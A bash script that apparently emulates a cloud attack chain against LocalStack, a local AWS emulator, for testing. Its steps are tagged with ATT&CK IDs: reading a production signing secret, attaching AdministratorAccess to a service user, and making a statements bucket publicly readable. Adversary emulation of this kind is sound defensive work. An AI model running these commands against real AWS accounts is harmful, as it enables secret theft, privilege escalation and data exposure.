#!/usr/bin/env bash
# SCATTERED SABLE cloud stage, live against LocalStack (benign - it's a local emulator).
set -euo pipefail
echo "[*] 1) Read the production signing secret (T1552.001)"
awslocal secretsmanager get-secret-value --secret-id prod/payments/signing-key >/dev/null
echo "[*] 2) Escalate: attach AdministratorAccess (T1548)"
awslocal iam attach-user-policy --user-name svc_payouts \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
echo "[*] 3) Make the statements bucket public (T1530)"
awslocal s3api put-bucket-policy --bucket kestrel-statements-prod \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::kestrel-statements-prod/*"}]}'
echo "[+] Attack actions complete. Now run: python collect.py"
